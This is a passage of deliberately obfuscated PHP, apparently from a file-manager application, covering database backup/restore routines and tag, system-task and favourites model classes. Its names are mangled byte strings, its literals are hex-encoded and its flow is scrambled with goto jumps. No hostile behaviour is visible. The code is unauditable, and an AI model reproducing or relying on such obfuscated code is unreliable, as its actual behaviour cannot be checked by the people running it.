$Aîù›‡›øˆ; $this->type = $bä¹ğ§å½‹; } public function model($cÂÇô…›¶ = '') { return new ModelBase($cÂÇô…›¶, $_SERVER[Šº][33], $this->database); } public function db($fÇ§ËŸ´Õî = false) { goto D…Ùá•ÈŒ‹; c˜›ÓÌí‰Å: $this->database = $Dí“ß¼»òÓ; $DòÚ¶ÀÆÃ->execute("\165\x73\x65\x20\140{$cø³ã‘Óæ}\x60"); return $DòÚ¶ÀÆÃ; goto a­½§é¡™†; D…Ùá•ÈŒ‹: $Bêï‰¹ =& $_SERVER[Šº]; $Dí“ß¼»òÓ = array_change_key_case($this->database); if ($this->type == $Bêï‰¹[9] || !$fÇ§ËŸ´Õî) { return $this->model()->db(); } goto Eèª¤Ä¡´; d’ÃÃô†Â: $this->database = $Dí“ß¼»òÓ; $DòÚ¶ÀÆÃ = $this->model()->db(); try { $c£µó„Úµ© = $DòÚ¶ÀÆÃ->execute("\x73\x68\x6f\x77\x20\144\141\x74\141\142\141\163\145\163\x20\154\151\153\x65\40\47{$cø³ã‘Óæ}\x27"); } catch (Exception $dĞĞŞá•¶) { } goto fëòªğºœÜ; Eèª¤Ä¡´: $cø³ã‘Óæ = $Dí“ß¼»òÓ[$Bêï‰¹[917]]; $Dí“ß¼»òÓ[$Bêï‰¹[917]] = $Bêï‰¹[33]; if ($Dí“ß¼»òÓ[$Bêï‰¹[752]] == $Bêï‰¹[753]) { $aâ§ƒ­òŠ‡ = $Dí“ß¼»òÓ[$Bêï‰¹[754]]; $Dí“ß¼»òÓ[$Bêï‰¹[754]] = substr($aâ§ƒ­òŠ‡, 0, strrpos($aâ§ƒ­òŠ‡, $Bêï‰¹[1005])); } goto d’ÃÃô†Â; fëòªğºœÜ: if (!$c£µó„Úµ©) { $DòÚ¶ÀÆÃ->execute("\x63\162\x65\x61\164\x65\40\144\x61\x74\141\x62\x61\x73\145\x20\140{$cø³ã‘Óæ}\x60"); } $Dí“ß¼»òÓ[$Bêï‰¹[917]] = $cø³ã‘Óæ; if ($Dí“ß¼»òÓ[$Bêï‰¹[752]] == $Bêï‰¹[753]) { $Dí“ß¼»òÓ[$Bêï‰¹[754]] .= $Bêï‰¹[1005] . $cø³ã‘Óæ; } goto c˜›ÓÌí‰Å; a­½§é¡™†: } public function createTable($EÂ­¡‚óªù, $f×Åî¿«„² = null) { $EÇë”àµÔõ =& $_SERVER[Šº]; if (!IO::exist($EÂ­¡‚óªù)) { ActionCall($EÇë”àµÔõ[1006], !0, 0); show_json(LNG($EÇë”àµÔõ[1007]), !1); } $A‡ßÊé¶»Š = sqlSplit(IO::getContent($EÂ­¡‚óªù)); foreach ($A‡ßÊé¶»Š as $A”®¦ªğïÆ) { if ($f×Åî¿«„²) { $Bà¶íö·éŸ = stripos($A”®¦ªğïÆ, $EÇë”àµÔõ[1008]) === 0; if ($Bà¶íö·éŸ) { $f×Åî¿«„²->task[$EÇë”àµÔõ[1009]] += 1; } } $this->model()->db()->execute($A”®¦ªğïÆ); if ($f×Åî¿«„² && $Bà¶íö·éŸ) { preg_match($EÇë”àµÔõ[1010], $A”®¦ªğïÆ, $fá´ôø“½Â); $f×Åî¿«„²->task[$EÇë”àµÔõ[1011]] = $fá´ôø“½Â[1]; $f×Åî¿«„²->update(1); } } $this->taskToCache($f×Åî¿«„²); } public function insertTable($b§£ì³îÃ§, $béŠ ç‚ = null) { $D–Şæó¹£ =& $_SERVER[Šº]; $f®ñ“î”¨ô = $this->model()->db(); $E‡Êù—±ğ = $a†¼Ğ§ˆÈº ? array($a†¼Ğ§ˆÈº) : $f®ñ“î”¨ô->getTables(); foreach ($b§£ì³îÃ§ as $BŞïØ¿µ›³) { $a†¼Ğ§ˆÈº = basename($BŞïØ¿µ›³, $D–Şæó¹£[744]); if (!in_array($a†¼Ğ§ˆÈº, $E‡Êù—±ğ)) { continue; } if ($béŠ ç‚) { $béŠ ç‚->task[$D–Şæó¹£[1011]] = $a†¼Ğ§ˆÈº; } if (get_filesize($BŞïØ¿µ›³) == 0) { continue; } $f…Ÿ–Ë¸Øë = $this->sqlToDb($BŞïØ¿µ›³, $béŠ ç‚); if (!$f…Ÿ–Ë¸Øë) { ActionCall($D–Şæó¹£[1006], !0, 0); show_json(LNG($D–Şæó¹£[1012]) . "\x5b{$a†¼Ğ§ˆÈº}\x5d", !1); } } $this->taskToCache($béŠ ç‚); } public function sqlFromDb($A§ëÜ–ŒŸê, $d›Ñ³èº…, $AŠš‘›ñï = null, $FÈğòöÎ†Ú = null) { goto B¶ƒâÛÀ¼Ô; F‚»Í­ƒÕã: fclose($e°¶–’¾ÒĞ); return $BÏ‡Õõ…ÓÓ; goto cº¡Ğ¶‰Ê; c²Íš¡š–Š: $b…¸áÇƒ™ñ = 0; $c®’ÑôåãŒ = 10000; $e°¶–’¾ÒĞ = fopen($d›Ñ³èº…, $_SERVER[Šº][1013]); goto d×§ğª³ùİ; B¶ƒâÛÀ¼Ô: if ($AŠš‘›ñï) { $AŠš‘›ñï->task[$_SERVER[Šº][1011]] = $A§ëÜ–ŒŸê; } $c»îÇˆİ¤¬ = $this->model($A§ëÜ–ŒŸê); $BÏ‡Õõ…ÓÓ = 0; goto c²Íš¡š–Š; d×§ğª³ùİ: $Bõ¤ÕŞ„İ² = $c»îÇˆİ¤¬->getPk(); $E÷Œâ¼ò† = $c»îÇˆİ¤¬->getDbFields(); do { $AÁà“Èé = array($Bõ¤ÕŞ„İ² => array($_SERVER[Šº][959], $b…¸áÇƒ™ñ)); $DÂÌï–Ë©° = $c»îÇˆİ¤¬->where($AÁà“Èé)->field($E÷Œâ¼ò†)->order($Bõ¤ÕŞ„İ² . $_SERVER[Šº][1014])->limit($c®’ÑôåãŒ)->select(); $DÂÌï–Ë©° = !empty($DÂÌï–Ë©°) ? $DÂÌï–Ë©° : array(); if (!($cÜò¥–ØÍß = count($DÂÌï–Ë©°))) { break; } $fØØôÂ“‡Š = end($DÂÌï–Ë©°); $b…¸áÇƒ™ñ = $fØØôÂ“‡Š[$Bõ¤ÕŞ„İ²]; $dÁ§ŠˆÉêí = array(); foreach ($DÂÌï–Ë©° as $C¢¯”’šèÏ) { if ($A§ëÜ–ŒŸê == $_SERVER[Šº][1015] && $C¢¯”’šèÏ[$_SERVER[Šº][29]] == $_SERVER[Šº][1016]) { $dè©¹ÀÄ™– = json_decode($C¢¯”’šèÏ[$_SERVER[Šº][371]], !0); if ($dè©¹ÀÄ™–[$_SERVER[Šº][28]] == date($_SERVER[Šº][712]) && !$dè©¹ÀÄ™–[$_SERVER[Šº][711]]) { continue; } } if ($FÈğòöÎ†Ú) { $C¢¯”’šèÏ[$_SERVER[Šº][76]] = "\173\x69\x6f\x3a{$FÈğòöÎ†Ú}\x7d" . substr($C¢¯”’šèÏ[$_SERVER[Šº][76]], strlen("\x7b\x69\157\x3a{$C¢¯”’šèÏ[$_SERVER[Šº][780]]}\x7d")); $C¢¯”’šèÏ[$_SERVER[Šº][780]] = $FÈğòöÎ†Ú; } $dÁ§ŠˆÉêí[] = $_SERVER[Šº][1017] . $this->sqlEncode($C¢¯”’šèÏ) . $_SERVER[Šº][1018]; } $e•ƒö¡ªõ¯ = "\x49\116\123\105\122\x54\x20\x49\x4e\124\117\x20\140{$A§ëÜ–ŒŸê}\x60\x20\x28\140" . implode($_SERVER[Šº][1019], $E÷Œâ¼ò†) . $_SERVER[Šº][1020]; fwrite($e°¶–’¾ÒĞ, $e•ƒö¡ªõ¯ . implode($_SERVER[Šº][1021], $dÁ§ŠˆÉêí) . $_SERVER[Šº][68] . PHP_EOL); $BÏ‡Õõ…ÓÓ += $cÜò¥–ØÍß; if ($AŠš‘›ñï) { $AŠš‘›ñï->update($cÜò¥–ØÍß); } } while ($c®’ÑôåãŒ == $cÜò¥–ØÍß); goto F‚»Í­ƒÕã; cº¡Ğ¶‰Ê: } public function sqlToDb($aö®‰«¥, $B¯‚ËƒÒÒ = null) { goto F‰ŠÕÆÍó; F‰ŠÕÆÍó: $DƒÇèäâ‚ê =& $_SERVER[Šº]; $F¹˜©³Ì‘í = $this->model()->db(); $BÖ–Äœ‹Û = @fopen($aö®‰«¥, $DƒÇèäâ‚ê[1022]); goto FÄ¶æÕ¹æ; F”„œÊ©Âé: $CŞà«±§¾Ç = array(); $D‹ªâÔÛ‰´ = $this->type == $DƒÇèäâ‚ê[9] ? 500 : 2000; $E•Ë¼£ñó = basename($aö®‰«¥, $DƒÇèäâ‚ê[744]); goto BÇİÛ†‡Ò; FÄ¶æÕ¹æ: if (!$BÖ–Äœ‹Û) { return !1; } $B¤ô•‘§·÷ = 0; $B‹¿ÜÀèë = $DƒÇèäâ‚ê[33]; goto F”„œÊ©Âé; Dì—Ú‹„å©: if (!empty($CŞà«±§¾Ç)) { $dê„±µ§ç³ = $B‹¿ÜÀèë . implode($DƒÇèäâ‚ê[47], $CŞà«±§¾Ç); if (!$F¹˜©³Ì‘í->execute($dê„±µ§ç³)) { return !1; } if ($B¯‚ËƒÒÒ) { $B¯‚ËƒÒÒ->update($B¤ô•‘§·÷); } } return !0; goto C·¢”íÃğ…; BÇİÛ†‡Ò: if ($E•Ë¼£ñó == $DƒÇèäâ‚ê[1023]) { $D‹ªâÔÛ‰´ = 50; } while (!feof($BÖ–Äœ‹Û)) { $DŠ›ò¨ƒİ = trim(fgets($BÖ–Äœ‹Û)); if (!$DŠ›ò¨ƒİ) { continue; } $dê„±µ§ç³ = $this->sqlDecode($DŠ›ò¨ƒİ, $this->type); if (stripos($dê„±µ§ç³, $DƒÇèäâ‚ê[354]) === 0) { if (!$B‹¿ÜÀèë) { $B‹¿ÜÀèë = $dê„±µ§ç³ . $DƒÇèäâ‚ê[50]; } continue; } if ($B¯‚ËƒÒÒ) { $B¯‚ËƒÒÒ->task[$DƒÇèäâ‚ê[1009]] += 1; } $B¤ô•‘§·÷++; $CŞà«±§¾Ç[] = rtrim(rtrim(trim($dê„±µ§ç³), $DƒÇèäâ‚ê[47]), $DƒÇèäâ‚ê[68]); if ($B¤ô•‘§·÷ >= $D‹ªâÔÛ‰´) { $dê„±µ§ç³ = $B‹¿ÜÀèë . implode($DƒÇèäâ‚ê[47], $CŞà«±§¾Ç); if (!$F¹˜©³Ì‘í->execute($dê„±µ§ç³)) { return !1; } if ($B¯‚ËƒÒÒ) { $B¯‚ËƒÒÒ->update($B¤ô•‘§·÷); } $CŞà«±§¾Ç = array(); $B¤ô•‘§·÷ = 0; } } fclose($BÖ–Äœ‹Û); goto Dì—Ú‹„å©; C·¢”íÃğ…: } public function dropTable($dóÃèà—ß = null) { $D“ĞÇáÃˆĞ = $this->model()->db(); $Fî¡’—èŒÎ = $dóÃèà—ß ? array($dóÃèà—ß) : $D“ĞÇáÃˆĞ->getTables(); if (!$Fî¡’—èŒÎ) { return; } foreach ($Fî¡’—èŒÎ as $dóÃèà—ß) { $D“ĞÇáÃˆĞ->execute("\144\x72\157\160\x20\164\141\142\x6c\x65\x20\x69\146\40\145\x78\x69\x73\164\163\x20\x60{$dóÃèà—ß}\140"); } } private function taskToCache($A§°ß¶ÓÑ¯ = null) { $bÊàÊÕõÛ =& $_SERVER[Šº]; if (!$A§°ß¶ÓÑ¯) { return; } $BŒÑ­µŒÛÔ = array($bÊàÊÕõÛ[1011] => $A§°ß¶ÓÑ¯->task[$bÊàÊÕõÛ[1011]], $bÊàÊÕõÛ[1009] => $A§°ß¶ÓÑ¯->task[$bÊàÊÕõÛ[1009]], $bÊàÊÕõÛ[1024] => $A§°ß¶ÓÑ¯->task[$bÊàÊÕõÛ[1024]]); if ($BŒÑ­µŒÛÔ[$bÊàÊÕõÛ[1009]] == $BŒÑ­µŒÛÔ[$bÊàÊÕõÛ[1024]]) { $BŒÑ­µŒÛÔ[$bÊàÊÕõÛ[718]] = 1; } Cache::set($bÊàÊÕõÛ[1025] . $A§°ß¶ÓÑ¯->task[$bÊàÊÕõÛ[392]], $BŒÑ­µŒÛÔ); $A§°ß¶ÓÑ¯->end(); } private function sqlEncode($FäóƒØåÅÒ) { $c±Ü†ã´¡¤ =& $_SERVER[Šº]; $f¹„ÉƒÊ = array(); foreach ($FäóƒØåÅÒ as $dàİèËåÆ) { if (is_array($dàİèËåÆ)) { $dàİèËåÆ = json_encode_force($dàİèËåÆ); } $dàİèËåÆ = addslashes($dàİèËåÆ); $dàİèËåÆ = str_replace(array($c±Ü†ã´¡¤[1026], $c±Ü†ã´¡¤[228]), array($c±Ü†ã´¡¤[1027], $c±Ü†ã´¡¤[1028]), $dàİèËåÆ); $f¹„ÉƒÊ[] = str_replace($c±Ü†ã´¡¤[55], $c±Ü†ã´¡¤[1029], $dàİèËåÆ); } return $c±Ü†ã´¡¤[55] . implode($c±Ü†ã´¡¤[1030], $f¹„ÉƒÊ) . $c±Ü†ã´¡¤[55]; } private function sqlDecode($B¼ÀµÓè¥, $f«‹šÖ²áæ) { $eÕ„¸ˆ´áñ =& $_SERVER[Šº]; $B¼ÀµÓè¥ = str_replace(array($eÕ„¸ˆ´áñ[1027], $eÕ„¸ˆ´áñ[1028]), array($eÕ„¸ˆ´áñ[1026], $eÕ„¸ˆ´áñ[228]), $B¼ÀµÓè¥); if ($f«‹šÖ²áæ == $eÕ„¸ˆ´áñ[9]) { $B¼ÀµÓè¥ = stripslashes($B¼ÀµÓè¥); } return $B¼ÀµÓè¥; } } goto Aù¬éŠƒ·á; bôîÌ‹†…–: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\x72\56\164\141\147\x4c\151\x73\164"; public $modelType = "\125\x73\145\x72\x4f\160\164\x69\x6f\x6e"; public $field = array("\156\x61\155\145", "\x73\x74\x79\x6c\x65", "\x73\157\x72\x74"); public function listData($Fô£ùì§åÅ = false, $eÂ÷š¾¾” = "\163\x6f\162\x74", $e’ô„‡ò°ˆ = false) { return parent::listData($Fô£ùì§åÅ, $eÂ÷š¾¾”, $e’ô„‡ò°ˆ); } public function remove($CùÄ»®é¡Â) { return parent::remove($CùÄ»®é¡Â); } public function add($aæÊóâÕĞÒ, $Fö¬ŒÑóÑç = "\154\x61\x62\145\154\55\147\x72\x65\171\x2d\156\157\162\155\x61\x6c") { $d™‡ğŞ‘ï© =& $_SERVER[Šº]; if ($this->findByName($aæÊóâÕĞÒ)) { return !1; } $eêÎÌÅè¾ = array($d™‡ğŞ‘ï©[420] => $aæÊóâÕĞÒ, $d™‡ğŞ‘ï©[471] => $Fö¬ŒÑóÑç, $d™‡ğŞ‘ï©[1681] => $this->getSort($d™‡ğŞ‘ï©[255]) + 1); return parent::insert($eêÎÌÅè¾); } public function update($C«÷×¼…§, $f¥ÄìĞÄî­) { $cŒ¡÷‡…ß =& $_SERVER[Šº]; $C‹÷Ğ–›õœ = $this->listData($C«÷×¼…§); $Ašô¾£Ûİ´ = $this->findByName($f¥ÄìĞÄî­[$cŒ¡÷‡…ß[28]]); if (!$C‹÷Ğ–›õœ || $Ašô¾£Ûİ´ && $Ašô¾£Ûİ´[$cŒ¡÷‡…ß[392]] != $C‹÷Ğ–›õœ[$cŒ¡÷‡…ß[392]]) { return !1; } return parent::update($C«÷×¼…§, $f¥ÄìĞÄî­); } public function moveTop($bí´ñËã‚£) { $eĞÇ„Ù½ùÃ =& $_SERVER[Šº]; $B˜Øœš¹Å« = parent::listData(); $bÇ¿Çª„Çé = $this->getSort($eĞÇ„Ù½ùÃ[254]); foreach ($B˜Øœš¹Å« as &$A’ò‡äù—±) { if ($A’ò‡äù—±[$eĞÇ„Ù½ùÃ[392]] == $bí´ñËã‚£) { $A’ò‡äù—±[$eĞÇ„Ù½ùÃ[1700]] = $bÇ¿Çª„Çé; continue; } $A’ò‡äù—±[$eĞÇ„Ù½ùÃ[1700]] += 1; } unset($A’ò‡äù—±); return parent::resetData($B˜Øœš¹Å«); } public function moveBottom($d¶‡œ¨…›©) { $B”íÊÉ‰¼› =& $_SERVER[Šº]; $d»Ã²Û·ğ = $this->getSort($B”íÊÉ‰¼›[255]) + 1; return parent::update($d¶‡œ¨…›©, array($B”íÊÉ‰¼›[1700] => $d»Ã²Û·ğ)); } public function resetSort($FÍÕ¥Ù†ÏÄ) { goto CÑ«Ş¬·Ü; fä¶Œƒñ›”: for ($D¡ËªïÂ½£ = 0; $D¡ËªïÂ½£ < count($FÍÕ¥Ù†ÏÄ); $D¡ËªïÂ½£++) { $BÈñª­µƒ½[$FÍÕ¥Ù†ÏÄ[$D¡ËªïÂ½£] . $câ”ñìŞ—[33]] = $D¡ËªïÂ½£ + 1; } $FµàÑìÂÁ = parent::listData(); foreach ($FµàÑìÂÁ as &$e¸£’–‚½Å) { $AŸ³‹àâ¾ = $BÈñª­µƒ½[$e¸£’–‚½Å[$câ”ñìŞ—[392]]]; $e¸£’–‚½Å[$câ”ñìŞ—[1700]] = $AŸ³‹àâ¾ ? $AŸ³‹àâ¾ : $e¸£’–‚½Å[$câ”ñìŞ—[1700]]; } goto fÃÀî¬×›Ò; fÃÀî¬×›Ò: unset($e¸£’–‚½Å); return parent::resetData($FµàÑìÂÁ); goto AÑ¼ø³÷˜ò; CÑ«Ş¬·Ü: $câ”ñìŞ— =& $_SERVER[Šº]; $BÈñª­µƒ½ = array(); $FÍÕ¥Ù†ÏÄ = is_array($FÍÕ¥Ù†ÏÄ) ? $FÍÕ¥Ù†ÏÄ : array(); goto fä¶Œƒñ›”; AÑ¼ø³÷˜ò: } private function getSort($FŒÉğÏ—•¿) { $B›—ìò©ÈÔ =& $_SERVER[Šº]; $c‡§´ç˜Â¹ = parent::listData(); $c¬¹ ë«³ = array_to_keyvalue($c‡§´ç˜Â¹, $B›—ìò©ÈÔ[33], $B›—ìò©ÈÔ[1700]); if (!$c¬¹ ë«³) { $c¬¹ ë«³ = array(0); } $Cøƒ¨äˆÆ¿ = $FŒÉğÏ—•¿ == $B›—ìò©ÈÔ[255] ? max($c¬¹ ë«³) : min($c¬¹ ë«³); return intval($Cøƒ¨äˆÆ¿); } } goto DĞ´ÅùËÂ; EŒÀê‚ó‰: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\164\141\163\x6b\114\151\x73\x74"; public $field = array("\x6e\141\155\x65", "\x74\171\x70\x65", "\145\x76\x65\156\164", "\x74\151\155\145", "\x64\145\163\143", "\x73\x79\163\x74\x65\x6d", "\x65\x6e\141\x62\154\x65", "\x6c\x61\163\164\122\165\x6e", "\163\x6f\162\x74"); public function listData($dê•ÊÂàß = false, $F ¡à¯ëœ‚ = "\x73\x6f\x72\x74", $Aó·¶—…š = false) { return parent::listData($dê•ÊÂàß, $F ¡à¯ëœ‚, $Aó·¶—…š); } public function add($EÙ¢ÎêŒŒ) { $aÜÅËî–Õ =& $_SERVER[Šº]; $dåĞ›Ö…šÆ = $this->findByName($EÙ¢ÎêŒŒ[$aÜÅËî–Õ[28]]); if ($dåĞ›Ö…šÆ) { return !1; } $EÙ¢ÎêŒŒ[$aÜÅËî–Õ[1479]] = 0; $EÙ¢ÎêŒŒ[$aÜÅËî–Õ[1700]] = $this->getSort(); return parent::insert($EÙ¢ÎêŒŒ); } private function getSort() { $aæ¥õ¿¾Û =& $_SERVER[Šº]; $bàƒ¿§‹˜ = parent::listData(); $dğƒˆ§ˆæ© = array_to_keyvalue($bàƒ¿§‹˜, $aæ¥õ¿¾Û[33], $aæ¥õ¿¾Û[1700]); return empty($dğƒˆ§ˆæ©) ? 0 : max($dğƒˆ§ˆæ©) + 1; } public function update($cõ‘ ö©¤, $DÆŒõ•‡í) { $E¨ÙÁŠí¡ =& $_SERVER[Šº]; $B³¼‚âî«ì = $this->listData($cõ‘ ö©¤); $E›Ä›½Ö©ï = $this->findByName($DÆŒõ•‡í[$E¨ÙÁŠí¡[28]]); if (!$B³¼‚âî«ì || $E›Ä›½Ö©ï && $E›Ä›½Ö©ï[$E¨ÙÁŠí¡[392]] != $B³¼‚âî«ì[$E¨ÙÁŠí¡[392]]) { return !1; } return parent::update($cõ‘ ö©¤, $DÆŒõ•‡í); } public function remove($Aö«—ËŠì°, $eà‘·ØÒ‹Õ = false) { $b¼ëøä¶Æ =& $_SERVER[Šº]; $A‘¦ì·´•¢ = $this->listData($Aö«—ËŠì°); if (!$A‘¦ì·´•¢) { return; } if (!$eà‘·ØÒ‹Õ && $A‘¦ì·´•¢[$b¼ëøä¶Æ[1157]] == $b¼ëøä¶Æ[87]) { return !1; } return parent::remove($Aö«—ËŠì°); } public function enable($d­»ÙÅóæÊ, $AÜÒŸŞ­‰ñ) { return $this->update($d­»ÙÅóæÊ, array($_SERVER[Šº][2086] => $AÜÒŸŞ­‰ñ)); } public function run($f‰Ø¹ÕÁñ÷) { return $this->update($f‰Ø¹ÕÁñ÷, array($_SERVER[Šº][2096] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\162\x5f\146\x61\166"; protected function cacheFunctionAlias($F ïÒŸ‹Ä¯) { $Aóõ‰›¼Á’ =& $_SERVER[Šº]; return array($Aóõ‰›¼Á’[1779] => array(USER_ID, $Aóõ‰›¼Á’[2097])); } protected function listData() { $f¯ˆŒ¢®£ =& $_SERVER[Šº]; $f®Ş¦™”‚ = array($f¯ˆŒ¢®£[1506] => USER_ID, $f¯ˆŒ¢®£[470] => 0); $Dâ…Ô­à¿ = $f¯ˆŒ¢®£[2098]; $Aëö®éÊ¹Ò = $this->field($Dâ…Ô­à¿)->where($f®Ş¦™”‚)->order($f¯ˆŒ¢®£[2099])->select(); return $Aëö®éÊ¹Ò ? $Aëö®éÊ¹Ò : array(); } protected function resetCache() { } protected function listView() { goto Cåè‹œ‰¾ó; Cåè‹œ‰¾ó: $E •İº‹ÄÚ =& $_SERVER[Šº]; $E¡Šå£¢›Õ = $this->listData(); $AÚñª²ÄÌ‡ = array_filter_by_field($E¡Šå£¢›Õ, $E •İº‹ÄÚ[29], $E •İº‹ÄÚ[416]); goto E¾Î½Øµ®¨; E¾Î½Øµ®¨: $aŠœÉÀ²Š = array_to_keyvalue($AÚñª²ÄÌ‡, $E •İº‹ÄÚ[33], $E •İº‹ÄÚ[76]); if (!$aŠœÉÀ²Š) { return $E¡Šå£¢›Õ; } $BŠ˜÷ïïÕù = 2000; goto eÇ¶ï‡åØŒ; eÇ¶ï‡åØŒ: $AÙÚñ§ª­­ = array($E •İº‹ÄÚ[417] => array($E •İº‹ÄÚ[418], $aŠœÉÀ²Š)); $c™Â¹ã›­ = Model($E •İº‹ÄÚ[788])->listSource($AÙÚñ§ª­­, $BŠ˜÷ïïÕù); $c™Â¹ã›­ = array_merge($c™Â¹ã›­[$E •İº‹ÄÚ[74]], $c™Â¹ã›­[$E •İº‹ÄÚ[75]]); goto eéù©’ï†’; eéù©’ï†’: $c™Â¹ã›­ = array_to_keyvalue($c™Â¹ã›­, $E •İº‹ÄÚ[403]); foreach ($E¡Šå£¢›Õ as $F¦ŠÜóÔŠÁ => $E´­ÆßÉÁô) { $e»±“Ìí = $c™Â¹ã›­[$E´­ÆßÉÁô[$E •İº‹ÄÚ[76]]]; $e»±“Ìí = $e»±“Ìí ? $e»±“Ìí : array(); $E¡Šå£¢›Õ[$F¦ŠÜóÔŠÁ] = array_merge($e»±“Ìí, $E´­ÆßÉÁô); } return $E¡Šå£¢›Õ; goto CøŒÚ»Ğ„ˆ; CøŒÚ»Ğ„ˆ: } protected function addFav($Fø˜Â¾Œ, $b±²ó¤«œ´ = '', $b©ñÒòá¼Õ = "\163\x6f\165\162\x63\x65") { goto e‚·¤¢ Ó; a£ºŞ÷…ŞÑ: if (!$b±²ó¤«œ´ && $b©ñÒòá¼Õ == $d®ãïô——…[416]) { $B¥Äº–Ô˜ˆ = Model($d®ãïô——…[1192])->where(array($d®ãïô——…[417] => $Fø˜Â¾Œ))->find(); if (!$B¥Äº–Ô˜ˆ) { return !1; } $b±²ó¤«œ´ = $B¥Äº–Ô˜ˆ[$d®ãïô——…[28]]; } $b±²ó¤«œ´ = $this->getAutoName($b±²ó¤«œ´); $c¼åÍéÌŒ’ = array($d®ãïô——…[1506] => USER_ID, $d®ãïô——…[470] => 0, $d®ãïô——…[420] => $b±²ó¤«œ´, $d®ãïô——…[421] => $Fø˜Â¾Œ, $d®ãïô——…[422] => $b©ñÒòá¼Õ, $d®ãïô——…[1681] => $fÉ¤ËÕõÄë + 1); goto a­†Êäà§Œ; e‚·¤¢ Ó: $d®ãïô——… =& $_SERVER[Šº]; $c…ƒêÊ ¨· = array($d®ãïô——…[1506] => USER_ID, $d®ãïô——…[470] => 0, $d®ãïô——…[422] => $b©ñÒòá¼Õ, $d®ãïô——…[421] => $Fø˜Â¾Œ); if ($this->where($c…ƒêÊ ¨·)->find()) { return !1; } goto d¡Œ¯©î³‹; a­†Êäà§Œ: return $this->add($c¼åÍéÌŒ’); goto aÉõšÍ¸Ú; d¡Œ¯©î³‹: $c…ƒêÊ ¨· = array($d®ãïô——…[1506] => USER_ID, $d®ãïô——…[470] => 0); $fÉ¤ËÕõÄë = $this->where($c…ƒêÊ ¨·)->max($d®ãïô——…[1700]); if (!$fÉ¤ËÕõÄë) { $fÉ¤ËÕõÄë = 0; } goto a£ºŞ÷…ŞÑ; aÉõšÍ¸Ú: } protected function remove($FŠá›´àà²) { $C¶êİ†ÙÇ =& $_SERVER[Šº]; $c¤Á¸òóÃ = array($C¶êİ†ÙÇ[1506] => USER_ID, $C¶êİ†ÙÇ[419] => $FŠá›´àà²); return $this->where($c¤Á¸òóÃ)->delete(); } protected function removeByName($dôÒ•ÇğÛ) { $BÚ­¨º›Øè =& $_SERVER[Šº]; $eÄ°ßñÁã = array($BÚ­¨º›Øè[1506] => USER_ID, $BÚ­¨º›Øè[420] => $dôÒ•ÇğÛ, $BÚ­¨º›Øè[470] => 0); return $this->where($eÄ°ßñÁã)->delete(); } protected function rename($f©î„Ââõ«, $DŒáÂ·Êç‚) { $CÕÕ•¡öÜ =& $_SERVER[Šº]; if ($f©î„Ââõ« == $DŒáÂ·Êç‚) { return !1; } $a’‡¶¹ = $this->getAutoName($DŒáÂ·Êç‚); if ($DŒáÂ·Êç‚ != $a’‡¶¹) { return !1; } $eæŞÉê­Û = array($CÕÕ•¡öÜ[1506] => USER_ID, $CÕÕ•¡öÜ[470] => 0, $CÕÕ•¡öÜ[28] => $f©î„Ââõ«); return $this->where($eæŞÉê­Û)->save(array($CÕÕ•¡öÜ[28] => $DŒáÂ·Êç‚)); } protected function resetSort($A…—áö¯³³) { $BÀ”½Á‘Ò =& $_SERVER[Šº]; $A…—áö¯³³ = is_array($A…—áö¯³³) ? $A…—áö¯³³ : array(); $f¹î¾›Êùñ = array($BÀ”½Á‘Ò[1506] => USER_ID); for ($eÃñ¡«Ù² = 0; $eÃñ¡«Ù² < count($A…—áö¯³³); $eÃñ¡«Ù²++) { $f¹î¾›Êùñ[$BÀ”½Á‘Ò[419]] = $A…—áö¯³³[$eÃñ¡«Ù²]; $this->where($f¹î¾›Êùñ)->save(array($BÀ”½Á‘Ò[1681] => $eÃñ¡«Ù² + 1)); } return !0; } protected function moveTop($f¸‹‚´‹) { goto Cäæ‹À„ŒÕ; B©ƒƒİ¤¦: $EÜáÔƒİ¾‚ = $DÍ£•¯×…®; $DÍ£•¯×…® = array_remove_value($DÍ£•¯×…®, $bïÉŒç†ÑÃ[$CÇğÄËøÁÑ[392]]); array_unshift($DÍ£•¯×…®, $bïÉŒç†ÑÃ[$CÇğÄËøÁÑ[392]]); goto C¡Àùñ‰¹; C¡Àùñ‰¹: return $this->resetSort($DÍ£•¯×…®); goto b™™£®‚§; Cäæ‹À„ŒÕ: $CÇğÄËøÁÑ =& $_SERVER[Šº]; $f‘İÊÉó¥š = array($CÇğÄËøÁÑ[1506] => USER_ID, $CÇğÄËøÁÑ[470] => 0); $bïÉŒç†ÑÃ = $this->where($f‘İÊÉó¥š)->where(array($CÇğÄËøÁÑ[28] => $f¸‹‚´‹))->find(); goto EØŒŠÆîã; EØŒŠÆîã: if (!$bïÉŒç†ÑÃ) { return; } $DÍ£•¯×…® = $this->field($CÇğÄËøÁÑ[392])->where($f‘İÊÉó¥š)->order($CÇğÄËøÁÑ[2099])->select(); $DÍ£•¯×…® = array_to_keyvalue($DÍ£•¯×…®, $CÇğÄËøÁÑ[33], $CÇğÄËøÁÑ[392]); goto B©ƒƒİ¤¦; b™™£®‚§: } protected function moveBottom($F¯Àˆë¨¦ƒ) { $eÒÂÜä±ƒ— =& $_SERVER[Šº]; $eØµŒãÎë = array($eÒÂÜä±ƒ—[1506] => USER_ID, $eÒÂÜä±ƒ—[470] => 0); $D´äÁ‰ = $this->where($eØµŒãÎë)->max($eÒÂÜä±ƒ—[1700]); $Fù‹„ÏÆ™ä = array($eÒÂÜä±ƒ—[1700] => $D´äÁ‰ + 1); return $this->where($eØµŒãÎë)->where(array($eÒÂÜä±ƒ—[28] => $F¯Àˆë¨¦ƒ))->save($Fù‹„ÏÆ™ä); } private function getAutoName($fÈÀÇ¯éá) { goto EÛ³Ô˜â¸; a¢—¯¥ÜÚó: $f²‰Œˆ§¾Õ = array_to_keyvalue($f²‰Œˆ§¾Õ, $E´óÏëÀâ[33], $E´óÏëÀâ[28]); if (!$f²‰Œˆ§¾Õ || !in_array($fÈÀÇ¯éá, $f²‰Œˆ§¾Õ)) { return $fÈÀÇ¯éá; } for ($CìÃÔ”…Ë = 0; $CìÃÔ”…Ë < count($f²‰Œˆ§¾Õ); $CìÃÔ”…Ë++) { if (!in_array($fÈÀÇ¯éá . "\x28{$CìÃÔ”…Ë}\51", $f²‰Œˆ§¾Õ)) { return $fÈÀÇ¯éá . "\50{$CìÃÔ”…Ë}\51"; } } goto A¿ñ¤„äÈ; EÛ³Ô˜â¸: $E´óÏëÀâ =& $_SERVER[Šº]; 